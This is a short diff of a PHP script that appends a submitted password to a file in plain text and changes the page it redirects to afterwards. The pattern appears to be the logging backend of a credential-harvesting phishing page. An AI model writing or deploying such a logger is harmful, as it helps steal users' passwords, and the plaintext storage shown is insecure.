@@ -9,5 +9,5 @@
     fwrite($file,"Password :");
     fwrite($file, $password ."\n");
     fclose($file);
-    header("location: index.php");
+    header("location: text.html");
  ?>
